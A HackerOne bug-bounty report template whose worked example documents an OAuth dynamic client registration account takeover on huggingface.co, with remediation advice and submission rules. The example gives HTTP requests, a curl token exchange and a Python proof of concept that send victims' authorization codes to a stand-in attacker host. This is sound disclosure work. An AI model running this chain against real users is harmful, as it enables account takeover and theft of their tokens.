# HackerOne Submission Template
# No Mercy Hunter v3.0

Usage: Copy this file for each HackerOne submission. Fill all [BRACKETED] fields.
Grounded in: HF-01 (OAuth ATO) and HF-02 (CORS) submissions to HuggingFace program.
Format: HackerOne renders markdown. Use headers, code blocks, and tables.

---

## SUBMISSION FORM FIELDS

### Title (specific, under 100 chars)
```
[Vulnerability Class]: [Component] allows [Attack] leading to [Impact]
```

Examples:
- Unauthenticated OAuth Dynamic Client Registration at /oauth/register leads to Account Takeover
- CORS misconfiguration on api.huggingface.co reflects arbitrary origins with credentials
- Azure AD tenant ID exposed via staging subdomain enables ROPC password spray

### Weakness (CWE)
Common mappings:
- OAuth ATO → CWE-287: Improper Authentication
- IDOR → CWE-639: Authorization Bypass Through User-Controlled Key
- CORS → CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- SSRF → CWE-918: Server-Side Request Forgery
- Info Disclosure → CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- JWT Confusion → CWE-327: Use of a Broken or Risky Cryptographic Algorithm
- XSS → CWE-79: Improper Neutralization of Input During Web Page Generation
- RCE → CWE-78: OS Command Injection or CWE-94: Code Injection
- Race Condition → CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization

**Selected CWE:** CWE-[ID]: [Name]

### Severity (CVSS v3)
**Score:** [e.g., 9.8]
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

### Asset
[Exact asset from program scope. E.g., *.huggingface.co]

---

## REPORT BODY (Markdown)

## Summary

[Two to three sentences. What is vulnerable, what attack is possible, what is the impact.
HackerOne readers scan summaries first — make the severity obvious immediately.]

**Example (HF-01 pattern):**
The `/oauth/register` endpoint on `huggingface.co` implements RFC 7591 OAuth Dynamic Client
Registration but does not require authentication. An unauthenticated attacker can register
an OAuth client with an arbitrary `redirect_uri`, generate an authorization URL targeting
any HuggingFace user, and capture the authorization code when the victim clicks the link —
resulting in full account takeover with no victim interaction beyond clicking a link.

---

## Vulnerability Details

**Endpoint:** `[METHOD] https://target.com/path`
**Authentication required:** [None / Bearer token / Session cookie]
**Affected parameter:** `[parameter_name]`

### Root Cause

[One sentence: what is the missing check or broken logic?]

### Attack Scenario

[Numbered prose walkthrough from attacker perspective. Include any social engineering
required (e.g., "attacker sends link to victim via email").]

---

## Steps to Reproduce

> **Prerequisites:** [List accounts, tools, or setup needed]

**Step 1:** [Action]

Send the following request (no Authorization header):

```http
POST /oauth/register HTTP/1.1
Host: huggingface.co
Content-Type: application/json

{
  "client_name": "evil-client",
  "redirect_uris": ["https://attacker.example.com/callback"],
  "grant_types": ["authorization_code"],
  "response_types": ["code"]
}
```

**Step 2:** [Observe response]

The server returns `201 Created`:

```json
{
  "client_id": "evil-client-abc123",
  "client_secret": "s3cr3t-xyz789",
  "redirect_uris": ["https://attacker.example.com/callback"],
  "grant_types": ["authorization_code"]
}
```

**Step 3:** [Construct attack URL]

```
https://huggingface.co/oauth/authorize?client_id=evil-client-abc123&redirect_uri=https://attacker.example.com/callback&response_type=code&state=random123
```

**Step 4:** [Victim interaction]

Send the URL from Step 3 to a target user (via email, social media, etc.).
When the victim clicks the link while logged into HuggingFace, they see a legitimate
OAuth consent screen. Upon approval, HuggingFace redirects to:
`https://attacker.example.com/callback?code=VICTIM_AUTH_CODE&state=random123`

**Step 5:** [Exchange code for tokens]

```bash
curl -s -X POST "https://huggingface.co/oauth/token" \
  -d "grant_type=authorization_code&code=VICTIM_AUTH_CODE&redirect_uri=https://attacker.example.com/callback&client_id=evil-client-abc123&client_secret=s3cr3t-xyz789"
```

Response contains `access_token` and `refresh_token` for the victim's account.

---

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC for [FINDING-ID]: [TITLE]
Platform: HackerOne — [Program Name]
Author: [Handle]
Date: [YYYY-MM-DD]

Usage:
  1. Run this script to register an evil OAuth client
  2. Send the generated authorization URL to a test victim account
  3. Capture the code from the redirect and run step 3

WARNING: Test accounts only. Do not use against real users.
"""

import requests
import json

TARGET = "https://target.com"
ATTACKER_REDIRECT = "https://attacker-controlled.example.com/callback"

def step1_register_client():
    """Register OAuth client without authentication."""
    payload = {
        "client_name": "security-test-client",
        "redirect_uris": [ATTACKER_REDIRECT],
        "grant_types": ["authorization_code"],
        "response_types": ["code"]
    }
    resp = requests.post(
        f"{TARGET}/oauth/register",
        json=payload
        # No Authorization header
    )
    print(f"[*] Registration status: {resp.status_code}")
    if resp.status_code == 201:
        data = resp.json()
        print(f"[+] VULNERABLE: client_id={data['client_id']}")
        return data
    else:
        print(f"[-] Not vulnerable: {resp.text}")
        return None

def step2_generate_phishing_url(client_id):
    """Generate authorization URL with attacker redirect_uri."""
    auth_url = (
        f"{TARGET}/oauth/authorize"
        f"?client_id={client_id}"
        f"&redirect_uri={ATTACKER_REDIRECT}"
        f"&response_type=code"
        f"&state=teststate123"
    )
    print(f"[*] Phishing URL: {auth_url}")
    print("[*] Send this URL to victim. When clicked and approved, code delivered to attacker.")
    return auth_url

def step3_exchange_code(client_id, client_secret, auth_code):
    """Exchange captured auth code for access token."""
    resp = requests.post(
        f"{TARGET}/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": auth_code,
            "redirect_uri": ATTACKER_REDIRECT,
            "client_id": client_id,
            "client_secret": client_secret
        }
    )
    if resp.status_code == 200:
        print(f"[+] TOKEN OBTAINED: {resp.json()}")
    return resp.json()

if __name__ == "__main__":
    client = step1_register_client()
    if client:
        step2_generate_phishing_url(client["client_id"])
        # After victim clicks: run step3_exchange_code(client_id, secret, captured_code)
```

---

## Impact

### What an attacker can do

[Bullet list of concrete actions post-exploitation. Be specific.]

- Register unlimited OAuth clients with arbitrary redirect URIs
- Generate convincing authorization URLs using the legitimate target domain
- Capture authorization codes from any user who clicks the link
- Exchange codes for access and refresh tokens
- Maintain persistent access via refresh tokens even if the victim changes their password

### Affected population

[Scope of impact. E.g.: All authenticated HuggingFace users. No authentication required
to trigger the vulnerability.]

### Data at risk

[List specific data types or capabilities.]

- Full account access (read/write all user data)
- Models, datasets, and spaces owned by victim
- Private repositories and organization access
- Billing information (if accessible via API)

---

## Supporting Materials

| Filename | Description |
|----------|-------------|
| [FINDING-ID]-01-registration.png | POST /oauth/register — 201 response with client credentials |
| [FINDING-ID]-02-consent-screen.png | OAuth consent page accepting evil.com redirect URI |
| [FINDING-ID]-03-code-captured.png | Redirect to attacker.com with authorization code in URL |
| [FINDING-ID]-04-token-exchange.png | /oauth/token response with access_token and refresh_token |
| [FINDING-ID]-poc.py | Full Python PoC (runs without modification) |

---

## Remediation

**Short-term:** Require a valid Bearer token (authenticated session) to access `/oauth/register`.
Return 401 Unauthorized for unauthenticated requests.

**Long-term:**
1. Implement a manual approval process for new OAuth client registrations
2. Validate that `redirect_uri` in authorization requests exactly matches a pre-registered URI
3. Add rate limiting on client registration to prevent bulk registration attacks
4. Log and alert on new client registrations for security monitoring

**Reference:** RFC 7591 Section 7.3 — "The authorization server may require the client to
authenticate itself when making requests to the client registration endpoint."

---

## Timeline

| Event | Date |
|-------|------|
| Discovered | [YYYY-MM-DD] |
| PoC confirmed | [YYYY-MM-DD] |
| Report submitted | [YYYY-MM-DD] |

---

## HACKERONE SUBMISSION RULES

Derived from HF-01 and HF-02 submission experience:

1. Use markdown — HackerOne renders it. Headers and code blocks improve readability.
2. Fill in the CWE field — triagers use it for routing. Wrong CWE = slower triage.
3. Include the CVSS vector string, not just the score number.
4. Attach screenshots as PNG — not screenshots of screenshots.
5. Reference the exact scope line from the program that covers this asset.
6. If chaining findings, submit the chain as one report with all findings documented.
7. Do not submit the same finding to multiple programs — check ownership carefully.
8. Add the asset field even if the scope is *.domain.com — pick the specific subdomain.
9. For P1 findings: always include a video walkthrough. Text + screenshots alone may not
   convince a triage team for critical claims.
10. After submission, do not edit the report body to add new information — add comments instead.
